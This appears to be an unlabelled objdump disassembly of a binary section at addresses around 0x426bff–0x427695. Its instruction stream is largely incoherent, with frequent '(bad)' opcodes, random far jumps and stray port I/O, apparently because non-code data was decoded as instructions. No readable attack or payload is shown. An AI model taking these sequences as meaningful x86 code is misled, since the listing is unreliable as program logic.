  426bff:	les    esi,FWORD PTR [eax+0x8]
  426c02:	or     eax,0xa50fb4e2
  426c07:	ss push edx
  426c09:	cld    
  426c0a:	xchg   edx,eax
  426c0b:	mov    ds:0x33992263,eax
  426c10:	sar    bh,0xd8
  426c13:	gs stos BYTE PTR es:[edi],al
  426c15:	jae    0x426c48
  426c17:	popa   
  426c18:	retf   
  426c19:	mov    dh,BYTE PTR [ecx+0x6afefbb9]
  426c1f:	push   0x1f880c77
  426c24:	lock add eax,0xfed66786
  426c2a:	push   ebx
  426c2b:	cmp    BYTE PTR [edi+0x24],bh
  426c2e:	or     eax,0x5c409a
	...
  426c4f:	add    BYTE PTR [ebx+0x15707fdf],ch
  426c55:	push   0xaad30000
  426c5a:	cld    
  426c5b:	inc    ecx
  426c5d:	rcl    DWORD PTR [esi+edi*2+0x31],1
  426c61:	xor    BYTE PTR [eax],al
  426c63:	add    BYTE PTR ds:0x8054ce1a,cl
  426c69:	sub    ebx,DWORD PTR [edi+ecx*2-0x98db2d]
  426c70:	jmp    0xedbc:0xfafd4502
  426c77:	retf   
  426c78:	in     eax,0x54
  426c7a:	dec    esp
  426c7b:	(bad)  
  426c7c:	jmp    0x42e2:0xdd3ddea
  426c83:	les    edx,FWORD PTR [eax+0x7b]
  426c86:	int3   
  426c87:	je     0x426cd6
  426c89:	addr16 pop eax
  426c8b:	fs sbb dh,0x63
  426c8f:	mov    BYTE PTR [eax+0x5f],ah
  426c92:	jne    0x426c14
  426c94:	adc    eax,0x84000068
  426c99:	add    BYTE PTR [ebx+eiz*2+0x2ee8197],ch
  426ca0:	or     eax,0xa6be2d00
  426ca5:	add    BYTE PTR [esi],ah
  426ca7:	mov    esi,0xc3d1979e
  426cac:	mov    cl,BYTE PTR [eax-0x3c74c05d]
  426cb2:	ds js  0x426cb5
	...
  426cd1:	add    bh,cl
  426cd3:	addr16 popa 
  426cd5:	xor    eax,DWORD PTR [ebx+eax*8+0xe2781a]
  426cdc:	ins    BYTE PTR es:[edi],dx
  426cdd:	out    0x27,eax
  426cdf:	test   al,0x5f
  426ce1:	out    0x6a,al
  426ce3:	adc    DWORD PTR [edi+ebp*8],0xffffffcd
  426ce7:	mov    ch,BYTE PTR [ebx-0x5c7525a1]
  426ced:	cmp    edx,edx
  426cef:	out    0xde,eax
  426cf1:	adc    ecx,DWORD PTR ds:0x31647f00
  426cf7:	add    bh,ah
  426cf9:	bound  esp,QWORD PTR [eax+0x2ec9a603]
  426cff:	add    al,0xe7
  426d01:	add    ecx,DWORD PTR ds:0xf8f3f35d
  426d07:	mov    edi,0xd2ca88e6
  426d0c:	rcl    DWORD PTR [eax+0x6316484f],cl
  426d12:	or     BYTE PTR [eax],0xae
  426d15:	stc    
  426d16:	out    dx,ax
  426d18:	es add al,0x8e
  426d1b:	aas    
  426d1c:	in     eax,dx
  426d1d:	mov    bh,ch
  426d1f:	(bad)  
  426d20:	out    0x3,al
  426d22:	fcom   st(2)
  426d24:	jp     0x426d92
  426d26:	das    
  426d27:	pop    ebp
  426d28:	test   DWORD PTR [ebx-0x6b],esp
  426d2b:	ret    0x1372
  426d2e:	jnp    0x426cef
  426d30:	push   DWORD PTR [ebp-0x7f]
  426d33:	fist   WORD PTR fs:[esi]
	...
  426d52:	add    BYTE PTR [eax],al
  426d54:	or     DWORD PTR [eax],eax
  426d56:	test   BYTE PTR [ecx],ch
  426d58:	(bad)  
  426d59:	hlt    
  426d5a:	gs push 0xffffffee
  426d5d:	dec    DWORD PTR [ebp*2-0x1603a1ad]
  426d64:	sti    
  426d65:	aas    
  426d66:	gs jo  0x426d7f
  426d69:	inc    esi
  426d6a:	inc    edx
  426d6b:	inc    edx
  426d6c:	or     BYTE PTR [ebp-0x4d],ah
  426d6f:	call   0xd5ac6d82
  426d74:	out    0xb9,al
  426d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d77:	jmp    0x9601ee8a
  426d7c:	xchg   DWORD PTR [bp+si+0x1d],ecx
  426d80:	(bad)  
  426d81:	xchg   ebp,eax
  426d82:	push   cs
  426d83:	fidiv  WORD PTR [ebp+eax*8-0x4]
  426d87:	fwait
  426d88:	add    DWORD PTR [edi-0x354aee11],0x6c8be8ff
  426d92:	call   0x82988982
  426d97:	(bad)  
  426d99:	add    DWORD PTR [edi-0x76fff118],0x54
  426da0:	aad    0x42
  426da2:	inc    edx
  426da3:	ror    DWORD PTR [esi],cl
  426da5:	cmp    esp,0x4893a3d
  426dab:	ins    BYTE PTR es:[edi],dx
  426dac:	fnsave [edi]
  426dae:	dec    esi
  426daf:	push   ds
  426db0:	outs   dx,BYTE PTR ds:[esi]
  426db1:	retf   
  426db2:	das    
  426db3:	fs dec esi
  426db5:	into   
  426db6:	sbb    cl,BYTE PTR [edi]
	...
  426dd4:	add    BYTE PTR [eax],al
  426dd6:	xchg   edx,eax
  426dd7:	(bad)  
  426dd8:	fistp  DWORD PTR [esi+0x6dbf73ff]
  426dde:	dec    esi
  426ddf:	into   
  426de0:	push   cs
  426de1:	bound  eax,QWORD PTR [edi]
  426de3:	out    0xfc,al
  426de5:	add    BYTE PTR [ebx],ch
  426de7:	fisttp WORD PTR [esp+esi*1+0x3b]
  426deb:	pop    ss
  426dec:	pop    ss
  426ded:	rol    BYTE PTR [edx-0x41],0x84
  426df1:	inc    ebp
  426df2:	mov    al,BYTE PTR ds:[ecx-0x10]
  426df6:	mov    ds:0xa4b81476,eax
  426dfb:	add    BYTE PTR es:[eax],al
  426dfe:	retf   0xd7fa
  426e01:	jb     0x426e6f
  426e03:	ja     0x426e31
  426e05:	jne    0x426e7b
  426e07:	jmp    DWORD PTR [ebp+0x3b]
  426e0a:	sub    al,0x36
  426e0c:	cmp    ch,BYTE PTR [edx-0x3e]
  426e0f:	jo     0x426d92
  426e11:	push   cs
  426e12:	and    ebx,esi
  426e14:	sti    
  426e15:	push   0x74
  426e17:	(bad)  
  426e18:	in     al,0xf3
  426e1a:	fiadd  DWORD PTR [ebx]
  426e1c:	add    BYTE PTR [edx-0x3b80f456],cl
  426e22:	xor    bh,ah
  426e24:	xor    edx,DWORD PTR [ecx+0x34]
  426e27:	jmp    DWORD PTR [ebp-0x3f]
  426e2a:	test   DWORD PTR [esi],0xaa98966
  426e30:	sti    
  426e31:	jmp    DWORD PTR [ebx]
  426e33:	push   0xe0229d85
  426e38:	sti    
  426e39:	inc    DWORD PTR [eax]
	...
  426e57:	add    BYTE PTR [ecx+0x43ff08da],dh
  426e5d:	loope  0x426de6
  426e5f:	(bad)  
  426e60:	dec    esp
  426e61:	fisttp DWORD PTR [esi+0x0]
  426e64:	hlt    
  426e65:	cmp    BYTE PTR [ebp+esi*2+0x17e49625],0x17
  426e6d:	add    al,0x0
  426e6f:	test   BYTE PTR [edx+esi*1+0x6cfa8b09],ah
  426e76:	std    
  426e77:	mov    dh,BYTE PTR [edx+0xde90ce0]
  426e7d:	mov    DWORD PTR [ebx],eax
  426e7f:	add    BYTE PTR ds:0xca0b84bc,cl
  426e85:	sbb    DWORD PTR [esi+0x4f],0x3e6b9dfe
  426e8c:	pop    esp
  426e8d:	imul   eax,DWORD PTR [eax],0xfe54cd84
  426e93:	or     al,0x62
  426e95:	jmp    0x426ea6
  426e97:	std    
  426e98:	mov    ds:0x2147cbb9,al
  426e9d:	ins    BYTE PTR es:[edi],dx
  426e9e:	and    edi,0xfffffff8
  426ea1:	xor    eax,DWORD PTR [edi]
  426ea3:	or     eax,0xfd11e3c2
  426ea8:	sbb    BYTE PTR [ecx],0xea
  426eab:	mov    esi,0xb50f604e
  426eb0:	push   esi
  426eb1:	ffree  st(4)
  426eb3:	out    dx,eax
  426eb4:	repz iret 
  426eb6:	sti    
  426eb7:	(bad)
  426eba:	add    DWORD PTR [ecx+0x0],ecx
	...
  426ed8:	add    BYTE PTR [eax],al
  426eda:	rol    BYTE PTR [eax],1
  426edc:	mov    ecx,DWORD PTR [edx+0x6d]
  426edf:	fist   WORD PTR [ebx]
  426ee1:	mov    eax,edx
  426ee3:	pop    eax
  426ee4:	out    0x88,al
  426ee6:	or     eax,0x91fe8983
  426eeb:	push   ecx
  426eec:	je     0x42d772
  426ef2:	xchg   esi,eax
  426ef3:	imul   ecx,DWORD PTR [ebp-0x48e8bab6],0x8500bdfc
  426efd:	mov    edi,0x80e65498
  426f02:	mov    BYTE PTR [edi-0x5866f3a1],bl
  426f08:	sbb    al,0xff
  426f0a:	sbb    DWORD PTR [edi-0x75],0xb7676704
  426f11:	cld    
  426f12:	cmp    eax,0x4f8cd300
  426f17:	push   esp
  426f18:	in     eax,dx
  426f19:	cdq    
  426f1a:	fcmovb st,st(1)
  426f1c:	sbb    dl,BYTE PTR [edx]
  426f1e:	inc    ebp
  426f1f:	shl    DWORD PTR [edi],cl
  426f21:	out    dx,al
  426f22:	sbb    BYTE PTR [ecx+0x2b],al
  426f25:	push   0x3e70013
  426f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f2b:	pop    es
  426f2c:	add    DWORD PTR [edi],ecx
  426f2e:	enter  0x82c3,0x9
  426f32:	or     eax,0x97bbe700
  426f37:	rcl    DWORD PTR [edx-0x18d4d295],cl
  426f3d:	add    eax,DWORD PTR [eax]
	...
  426f5b:	add    BYTE PTR [ebx+eax*8+0xc01056],al
  426f62:	xchg   edi,eax
  426f63:	mov    WORD PTR [eax-0x50],cs
  426f66:	ror    BYTE PTR [edi],1
  426f68:	aam    0x8a
  426f6a:	mov    bl,0x73
  426f6c:	push   0x19
  426f6e:	push   ebp
  426f6f:	add    ecx,DWORD PTR ds:0xa286bfb7
  426f75:	(bad)  
  426f77:	pusha  
  426f78:	fbld   TBYTE PTR [ebx+0x61]
  426f7b:	(bad)  
  426f7c:	bound  ecx,QWORD PTR [ecx]
  426f7e:	push   esi
  426f7f:	add    ebx,ebp
  426f81:	test   BYTE PTR ds:0x2ac397b3,ch
  426f87:	mov    bl,0x32
  426f89:	es cmp eax,0x6b853160
  426f8f:	aaa    
  426f90:	stos   BYTE PTR es:[edi],al
  426f91:	(bad)  
  426f93:	add    al,0x99
  426f95:	pop    es
  426f96:	jb     0x426f9f
  426f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f99:	(bad)  
  426f9a:	cmp    eax,0x6213c25f
  426f9f:	rcl    DWORD PTR [edx],0x5a
  426fa2:	sub    esi,DWORD PTR [eax-0x73]
  426fa5:	ret    0x8ce
  426fa8:	mov    edx,es
  426faa:	dec    eax
  426fac:	movq   QWORD PTR [edx-0x4b],mm0
  426fb0:	sbb    DWORD PTR [eax+0xb15957a],eax
  426fb6:	sbb    BYTE PTR [eax+0x6c],0x5c
  426fba:	cld    
  426fbb:	(bad)  
  426fbc:	les    ebp,FWORD PTR [edx+eax*4]
  426fbf:	test   eax,0x0
	...
  426fdc:	add    BYTE PTR [eax],al
  426fde:	in     eax,0x6
  426fe0:	mov    ecx,esi
  426fe2:	jle    0x42703f
  426fe4:	dec    esi
  426fe5:	icebp  
  426fe6:	(bad)  
  426fe7:	fst    st(3)
  426fe9:	jmp    0xe8d1ef75
  426fee:	push   cs
  426fef:	add    BYTE PTR [edi-0x3a71696],al
  426ff5:	jmp    0x6b07af81
  426ffa:	icebp  
  426ffb:	pop    eax
  426ffc:	cld    
  426ffd:	jmp    0xe9bcd813
  427002:	push   cs
  427003:	add    BYTE PTR [ecx+ebp*1+0x7f0cf655],al
  42700a:	mov    ss,WORD PTR [eax]
  42700c:	(bad)  
  42700d:	call   0xc5caf720
  427012:	or     DWORD PTR [eax],eax
  427014:	add    BYTE PTR [eax+0x7d],dh
  427017:	jg     0x427038
  427019:	call   0x6b40702c
  42701e:	sub    DWORD PTR [ecx-0x4],ebx
  427021:	jmp    0x940635bd
  427026:	adc    dh,BYTE PTR [esi-0x677a1778]
  42702c:	jae    0x427004
  42702e:	sbb    edx,DWORD PTR [edx+0x821b0]
  427034:	add    BYTE PTR [edx+0x4e],dh
  427037:	add    BYTE PTR [edi-0x1078093],al
  42703d:	call   0xc2c650
	...
  42705e:	add    BYTE PTR [eax],al
  427060:	or     al,0xfd
  427062:	(bad)  
  427063:	jmp    DWORD PTR [edi-0x44]
  427066:	add    BYTE PTR [edx+0x31],cl
  427069:	sar    DWORD PTR [ebp+edi*2-0x61],0xfc
  42706e:	jo     0x427091
  427070:	(bad)  
  427071:	out    dx,eax
  427072:	mov    BYTE PTR [ebp+0x3c],al
  427075:	xchg   ebx,eax
  427076:	mov    DWORD PTR [ebp+0x30],eax
  427079:	xchg   ebx,eax
  42707a:	sti    
  42707b:	adc    eax,0x3c4e28
  427080:	aaa    
  427081:	mov    edi,0x77f18d08
  427086:	dec    esp
  427087:	push   0x1
  427089:	push   0x8
  42708b:	pop    eax
  42708c:	mov    WORD PTR ds:0x702bfed3,ss
  427092:	jno    0x427060
  427094:	cmp    al,0xed
  427096:	mov    bl,0xff
  427098:	cmp    edx,DWORD PTR [esi-0x3ed2a4a6]
  42709e:	add    BYTE PTR [eax],al
  4270a0:	mov    ds:0x77f0878e,al
  4270a5:	mov    dh,0x35
  4270a7:	mov    esi,0xfffffc98
  4270ac:	mov    eax,ds:0xa357535b
  4270b1:	mov    ?,ebx
  4270b3:	adc    eax,0x3c4c40
  4270b8:	in     eax,dx
  4270b9:	jl     0x427113
  4270bb:	add    DWORD PTR [ebx+eax*1],esi
  4270be:	aaa    
  4270bf:	mov    ecx,0xc031fe
	...
  4270e1:	add    BYTE PTR [edi],bl
  4270e3:	add    DWORD PTR [eax-0x406a64ff],esi
  4270e9:	push   ebp
  4270ea:	scas   eax,DWORD PTR es:[edi]
  4270eb:	out    0x7f,al
  4270ed:	in     al,dx
  4270ee:	clc    
  4270ef:	nop
  4270f0:	xchg   eax,ebx
  4270f2:	lahf   
  4270f3:	add    BYTE PTR [ecx+eax*1],0xd
  4270f7:	imul   eax,DWORD PTR [eax],0x86a55087
  4270fd:	adc    BYTE PTR [ecx],0x68
  427100:	add    BYTE PTR [eax],al
  427102:	arpl   ax,dx
  427104:	(bad)
  427108:	pop    ds
  427109:	(bad)  
  42710a:	jmp    0x8918:0xdb30b368
  427111:	jb     0x4270c8
  427113:	popf   
  427114:	(bad)  
  427115:	fisttp WORD PTR [ecx+ebp*2]
  427118:	add    BYTE PTR [eax],al
  42711a:	xchg   esp,eax
  42711b:	sbb    ebp,DWORD PTR [esp+edi*8+0x18]
  42711f:	popa   
  427120:	out    dx,al
  427121:	aas    
  427122:	or     eax,0xf4f7d4d0
  427127:	sbb    DWORD PTR [esi+edi*8-0x79f49756],edi
  42712e:	and    ebp,DWORD PTR [eax+0x0]
  427131:	add    BYTE PTR [esi-0x6d014817],al
  427137:	push   0xe1854a87
  42713c:	pop    ss
  42713d:	mov    BYTE PTR [ebx-0x5d],cl
  427140:	pop    edx
  427141:	call   DWORD PTR [ecx+0x840b0e]
	...
  427163:	add    cl,bl
  427165:	add    BYTE PTR [bx+si],al
  427168:	xchg   esi,eax
  427169:	sahf   
  42716a:	or     BYTE PTR [ebx+0x69f1744d],al
  427170:	or     eax,0xf1125b99
  427175:	pop    ecx
  427176:	sar    bh,0x91
  427179:	sub    BYTE PTR [ebx],cl
  42717b:	test   BYTE PTR [ecx],al
  42717d:	push   0x9b530000
  427182:	pop    ebp
  427183:	dec    DWORD PTR [eax-0x5d]
  427186:	pop    ebx
  427187:	call   FWORD PTR [ebx]
  427189:	pextrw edi,mm4,0x4c
  42718d:	inc    esi
  42718f:	add    BYTE PTR [ebx+eax*8-0x4374c01d],al
  427196:	ret    0xd386
  427199:	add    eax,0x56024763
  42719e:	out    0xc,al
  4271a0:	ret    
  4271a1:	mov    edi,0x47ecbea
  4271a6:	pop    ds
  4271a7:	xlat   BYTE PTR ds:[ebx]
  4271a8:	add    DWORD PTR [ebx-0x7e9747dc],eax
  4271ae:	fdivrp st(4),st
  4271b0:	in     eax,0xfd
  4271b2:	imul   eax,ebp,0x4e
  4271b5:	fisubr WORD PTR [ecx+0x1b]
  4271b8:	bswap  ebx
  4271ba:	jecxz  0x427146
  4271bc:	dec    edi
  4271bd:	dec    esp
  4271be:	xchg   ecx,eax
  4271bf:	pop    es
  4271c0:	mov    ebx,ds
  4271c2:	jb     0x4271c7
  4271c4:	mov    ebx,ss
  4271c6:	jp     0x4271cb
	...
  4271e4:	add    BYTE PTR [eax],al
  4271e6:	sbb    BYTE PTR [ebx+edx*2+0x3],bh
  4271ea:	or     eax,0x5094f600
  4271ef:	in     al,dx
  4271f0:	jno    0x4271a7
  4271f2:	add    cl,BYTE PTR [ecx+0x54dcb40f]
  4271f8:	rcl    DWORD PTR [edi-0x7f],cl
  4271fb:	lods   eax,DWORD PTR ds:[esi]
  4271fc:	(bad)  
  4271fd:	xchg   DWORD PTR [edx-0x107f0f34],edi
  427203:	dec    edi
  427204:	out    0x45,al
  427206:	iret   
  427207:	push   ebp
  427208:	out    0x68,eax
  42720a:	fist   DWORD PTR [ebx+edi*8+0x4f]
  42720e:	(bad)  
  42720f:	mov    edi,0x1d139ae6
  427214:	out    0x3,eax
  427216:	add    al,0x3f
  427218:	lea    ebx,[edi]
  42721a:	mov    ecx,0xbb4b71ad
  42721f:	data16 (bad) [ecx*1+0x5a7d0000]
  427227:	and    dh,0xd7
  42722a:	adc    DWORD PTR [ebp+edi*4-0x17],edi
  42722e:	push   cs
  42722f:	add    BYTE PTR [ecx+0x3dcc05d0],al
  427235:	(bad)  
  427236:	int3   
  427237:	push   0x1cd970c
  42723c:	fcomp  DWORD PTR [ecx]
  42723e:	imul   edx,DWORD PTR [esi],0xb056bef9
  427244:	out    0x4e,eax
  427246:	dec    edx
  427247:	push   esp
  427248:	cld    
  427249:	scas   al,BYTE PTR es:[edi]
	...
  427266:	add    BYTE PTR [eax],al
  427268:	jp     0x427222
  42726a:	(bad)  
  42726b:	call   0x5954c57e
  427270:	fist   DWORD PTR [eax+eax*1]
  427273:	xor    bh,0x18
  427276:	inc    ecx
  427277:	(bad)  
  427278:	push   cs
  427279:	add    BYTE PTR [esi+ebx*4+0x14],bh
  42727d:	mov    esp,0xd60ee924
  427282:	or     eax,0x1bccb4
  427287:	jmp    0xb87d6e5e
  42728c:	out    dx,eax
  42728d:	(bad)  
  42728e:	call   ebx
  427290:	dec    eax
  427291:	aad    0x7a
  427293:	push   edi
  427294:	adc    ecx,edx
  427296:	or     esp,DWORD PTR [edi]
  427298:	dec    esp
  427299:	push   edx
  42729a:	(bad)  
  42729b:	outs   dx,DWORD PTR ds:[esi]
  42729c:	dec    esp
  42729d:	fs call 0xfb04478d
  4272a3:	aaa    
  4272a4:	dec    esp
  4272a5:	push   ebx
  4272a6:	jg     0x427254
  4272a8:	(bad)  
  4272a9:	dec    BYTE PTR [ebx+ebp*2]
  4272ac:	pop    edi
  4272ad:	push   ebx
  4272ae:	cld    
  4272af:	push   ds
  4272b0:	mov    ecx,ebx
  4272b2:	cli    
  4272b3:	jmp    0x427312
  4272b5:	add    al,0x89
  4272b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272b8:	push   ss
  4272b9:	cmp    DWORD PTR [edi-0x3d084800],0x22f92046
  4272c3:	add    BYTE PTR [eiz*8-0x494e7fd7],dh
  4272ca:	cld    
  4272cb:	jae    0x4272cd
	...
  4272e9:	add    BYTE PTR [edx],al
  4272eb:	jge    0x427367
  4272ed:	jo     0x427313
  4272ef:	das    
  4272f0:	adc    al,ch
  4272f2:	int    0x70
  4272f4:	sti    
  4272f5:	jmp    FWORD PTR [edi+0x7a]
  4272f8:	push   eax
  4272f9:	add    esp,esp
  4272fb:	inc    DWORD PTR [esi+0x207acc4d]
  427301:	mov    ah,dh
  427303:	loop   0x427315
  427305:	mov    ebp,DWORD PTR [edx]
  427307:	add    al,0x81
  427309:	sar    al,0x8
  42730c:	xchg   DWORD PTR [ebp+0x74],ecx
  42730f:	test   BYTE PTR [edx+0xc],cl
  427312:	add    al,0xb7
  427314:	adc    DWORD PTR [eax-0x103c03a],esi
  42731a:	jmp    0x8c87fad2
  42731f:	bnd jle 0x42737a
  427322:	mov    ch,0xff
  427324:	dec    DWORD PTR [esi]
  427326:	ss jge 0x427323
  427329:	push   DWORD PTR [ebx]
  42732b:	xor    bh,0xe8
  42732e:	push   edi
  42732f:	cld    
  427330:	(bad)  
  427331:	jmp    ebx
  427333:	das    
  427334:	in     al,0xff
  427336:	jns    0x427383
  427338:	push   cs
  427339:	inc    eax
  42733a:	fs xchg esi,eax
  42733c:	pop    edx
  42733d:	pop    ebx
  42733e:	cmp    eax,0xd08b51ba
  427343:	jns    0x42732d
  427345:	sbb    BYTE PTR [edx-0x72],bh
  427348:	xchg   eax,edi
  42734a:	fistp  QWORD PTR [ecx]
  42734c:	or     al,0x85
	...
  42736a:	add    BYTE PTR [eax],al
  42736c:	and    al,0x6
  42736e:	test   al,dh
  427370:	or     eax,0x3b000069
  427375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427376:	sti    
  427377:	dec    BYTE PTR [ebx]
  427379:	in     eax,0x5e
  42737b:	push   DWORD PTR [edx]
  42737d:	imul   ecx,DWORD PTR [edx-0x2019fbc0],0x49630df7
  427387:	xchg   eax,edx
  427389:	pop    ecx
  42738a:	test   BYTE PTR [ecx+edx*8+0x5d000067],al
  427391:	loopne 0x42734f
  427393:	jmp    0x427397
  427395:	dec    esp
  427396:	clc    
  427397:	adc    DWORD PTR [ebp+0x69],ecx
  42739a:	cmp    DWORD PTR [ebp+edx*2+0xd000068],0x5a
  4273a2:	jle    0x427345
  4273a4:	or     eax,0x92890069
  4273a9:	adc    al,0x1
  4273ab:	add    BYTE PTR ds:0x96f7c4ce,cl
  4273b1:	xor    al,0x88
  4273b3:	xchg   BYTE PTR [eax],bh
  4273b5:	ins    DWORD PTR es:[edi],dx
  4273b6:	jl     0x4273ad
  4273b8:	inc    ecx
  4273b9:	or     eax,0xdc05458b
  4273be:	inc    ebx
  4273bf:	jae    0x427411
  4273c1:	inc    DWORD PTR [ebx]
  4273c3:	push   eax
  4273c4:	mov    ds:0x4d10f42b,al
  4273c9:	imul   edi,DWORD PTR [ebp-0x41],0x458b2118
	...
  4273ec:	add    BYTE PTR [eax],al
  4273ee:	std    
  4273ef:	fistp  QWORD PTR [edi+ebp*8+0x2dd02888]
  4273f6:	xchg   BYTE PTR [edx+0xcc888f0],dl
  4273fc:	cmp    DWORD PTR [edi+0x183a1203],0x5b
  427403:	add    eax,0x16954
  427408:	je     0x4273cc
  42740a:	push   cs
  42740b:	mov    al,0x6b
  42740d:	lds    esp,FWORD PTR [eax+esi*4]
  427410:	adc    eax,0xa6e9daef
  427415:	add    ecx,DWORD PTR [ebx+edi*1-0x338d810e]
  42741c:	out    dx,al
  42741d:	(bad)  
  42741e:	iret   
  42741f:	push   edx
  427420:	scas   al,BYTE PTR es:[edi]
  427421:	ror    DWORD PTR ds:0xcf58d6cc,0x57
  427428:	jno    0x4273e8
  42742a:	sbb    dl,BYTE PTR [esi]
  42742c:	mov    bx,0x520b
  427430:	out    0xd5,al
  427432:	popf   
  427433:	sbb    DWORD PTR gs:[ebp+0x4171507f],ecx
  42743a:	test   DWORD PTR [ebp-0x32],eax
  42743d:	push   cs
  42743e:	jmp    0x48cf5b43
  427443:	or     BYTE PTR [ebx+eax*2+0x5e],ah
  427447:	add    eax,0x6e16a
  42744c:	aaa    
  42744d:	pop    ecx
  42744e:	pop    ds
  42744f:	nop
  427450:	clc    
  427451:	ret    
	...
  42746e:	add    BYTE PTR [eax],al
  427470:	ret    0x1386
  427473:	push   eax
  427474:	mov    dl,0x3e
  427476:	cmp    bl,BYTE PTR [eax-0x4f]
  427479:	test   DWORD PTR [ebp-0x51],esp
  42747c:	stos   DWORD PTR es:[edi],eax
  42747d:	push   ecx
  42747e:	out    0x8c,al
  427480:	push   edi
  427481:	pop    eax
  427482:	imul   ebx,DWORD PTR [edi],0xbe720085
  427488:	call   0xe651:0x8bbb6615
  42748f:	iret   
  427490:	punpckhbw mm4,QWORD PTR [ecx+0x46000d03]
  427497:	into   
  427498:	push   cx
  42749a:	shl    edi,cl
  42749c:	cld    
  42749d:	mov    edi,0x14f1e8ff
  4274a2:	cmc    
  4274a3:	adc    DWORD PTR [ebx-0x36fdea38],edx
  4274a9:	pop    ds
  4274aa:	mov    edi,0x80005673
  4274af:	add    BYTE PTR [eax],bl
  4274b1:	int    0x10
  4274b3:	bound  ebx,QWORD PTR [ebp+0xee8fe85]
  4274b9:	jg     0x42747a
  4274bb:	in     eax,0x5e
  4274bd:	pop    ecx
  4274be:	and    ah,BYTE PTR ds:0x298353c5
  4274c4:	dec    edx
  4274c5:	jmp    0xd1c55b1a
  4274ca:	(bad)  
  4274cb:	call   0x9aefdcde
  4274d0:	pop    ebx
  4274d1:	push   esp
  4274d2:	sub    DWORD PTR [ecx+0x0],0x0
	...
  4274f1:	add    ch,bl
  4274f3:	clc    
  4274f4:	push   esp
  4274f5:	jb     0x427545
  4274f7:	pop    ecx
  4274f8:	pop    ss
  4274f9:	in     eax,0xe
  4274fb:	add    BYTE PTR [ebp+0x17],bl
  4274fe:	push   eax
  4274ff:	inc    eax
  427500:	xor    BYTE PTR [eax+0x76362dfe],ah
  427506:	xchg   ecx,eax
  427507:	push   ecx
  427508:	cld    
  427509:	jmp    0x649881e6
  42750e:	xchg   edx,eax
  42750f:	lods   al,BYTE PTR ds:[esi]
  427510:	(bad)  
  427511:	call   0xefcb2424
  427516:	(bad)  
  427517:	adc    al,0x90
  427519:	jmp    0xd5cb70f8
  42751e:	push   ds
  42751f:	jp     0x42753c
  427521:	popa   
  427522:	sar    BYTE PTR [esi+0x51517e38],1
  427528:	cld    
  427529:	jmp    0x129acd8a
  42752e:	cmp    ch,cl
  427530:	or     eax,0xfea89260
  427535:	jmp    DWORD PTR [esp+edi*8+0x66]
  427539:	leave  
  42753a:	mov    al,ds:0x74a1bfe4
  42753f:	cld    
  427540:	pop    ebp
  427541:	ret    
  427542:	ja     0x4274e5
  427544:	xchg   DWORD PTR ds:0x3c6294,edi
  42754a:	addr16 adc eax,0xd1a91067
  427550:	add    al,0x1
  427552:	and    al,0xfc
  427554:	ret    0x6
	...
  427573:	add    BYTE PTR [ebx+esi*1+0x3c],al
  427577:	add    BYTE PTR [edi-0x6b617a74],al
  42757d:	sti    
  42757e:	(bad)  
  42757f:	jmp    FWORD PTR [ebp+0x240160c9]
  427585:	cld    
  427586:	cli    
  427587:	xlat   BYTE PTR ds:[ebx]
  427588:	pop    esi
  427589:	cld    
  42758a:	mov    BYTE PTR [esi+0x4fc],al
  427590:	aaa    
  427591:	xchg   esp,eax
  427592:	sti    
  427593:	xlat   BYTE PTR ds:[ebx]
  427594:	pop    esi
  427595:	dec    esp
  427596:	mov    DWORD PTR [esi+0x514],eax
  42759c:	pop    es
  42759d:	xchg   esp,eax
  42759e:	sti    
  42759f:	xlat   BYTE PTR ds:[ebx]
  4275a0:	addr16 mov edx,db5
  4275a4:	sar    BYTE PTR [ebx-0x66],1
  4275a7:	cmp    BYTE PTR [ebp-0x5617fffd],dh
  4275ad:	mov    edx,0x78f4fffc
  4275b2:	inc    edx
  4275b3:	add    al,0x9c
  4275b5:	dec    edx
  4275b6:	sub    eax,0x397a2bff
  4275bb:	and    dh,al
  4275bd:	inc    ebx
  4275be:	cld    
  4275bf:	mov    WORD PTR [edx],?
  4275c1:	idiv   esp
  4275c3:	jmp    DWORD PTR [ebx+edx*4-0x33062805]
  4275ca:	add    DWORD PTR fs:0x84500059,ecx
  4275d1:	fild   QWORD PTR [esi+edi*8-0x6274a68e]
	...
  4275f4:	add    BYTE PTR [eax],al
  4275f6:	lds    edx,FWORD PTR [edi+0x0]
  4275f9:	add    BYTE PTR [edi+esi*4+0x595afeb4],dl
  427600:	push   ebp
  427601:	aam    0x86
  427603:	popf   
  427604:	sbb    al,0xc
  427606:	xchg   esp,eax
  427607:	out    0x70,eax
  427609:	inc    BYTE PTR [edx+0x59]
  42760c:	xchg   DWORD PTR [ebp+0x58a1],eax
  427612:	(bad)  
  427614:	jb     0x427695
  427616:	or     al,0x59
  427618:	add    BYTE PTR [edi+0x3dd83],al
  42761e:	or     eax,0x865c2a5e
  427623:	lahf   
  427624:	mov    dh,0xc1
  427626:	adc    DWORD PTR [ecx-0x55],ebx
  427629:	mov    BYTE PTR [ecx+eax*2],al
  42762c:	out    dx,al
  42762d:	(bad)  
  42762e:	cli    
  42762f:	pop    eax
  427630:	dec    edx
  427631:	inc    ebx
  427632:	sub    DWORD PTR [ecx+0x1],edx
  427635:	je     0x42764a
  427637:	imul   BYTE PTR [ebx-0x3e]
  42763a:	lods   al,BYTE PTR ds:[esi]
  42763b:	pop    eax
  42763c:	add    BYTE PTR [ecx+0x341fdd2],cl
  427642:	or     eax,0x1169ae0a
  427647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427648:	cli    
  427649:	pop    ds
  42764a:	inc    esp
  42764b:	sbb    DWORD PTR [ebx+ecx*4],eax
  42764e:	and    BYTE PTR [eax+0x1],0x0
  427652:	or     eax,0x900d8722
  427657:	(bad)  
  427658:	iret   
  427659:	add    eax,0x0
	...
  427676:	add    BYTE PTR [eax],al
  427678:	xchg   esi,eax
  427679:	push   edi
  42767a:	out    0xfe,al
  42767c:	fwait
  42767d:	sub    BYTE PTR [edi-0x3b],bh
  427680:	or     DWORD PTR [eax],eax
  427682:	mov    dl,0xce
  427684:	js     0x42768e
  427686:	jle    0x427644
  427688:	or     DWORD PTR [esi-0x1a],0xffffffcd
  42768c:	sbb    BYTE PTR [ebx+0x65],bh
  42768f:	mov    al,0x73
  427691:	dec    esi
  427692:	out    0x86,al
  427694:	push   cs
  427695:	push   0xd40d1c69
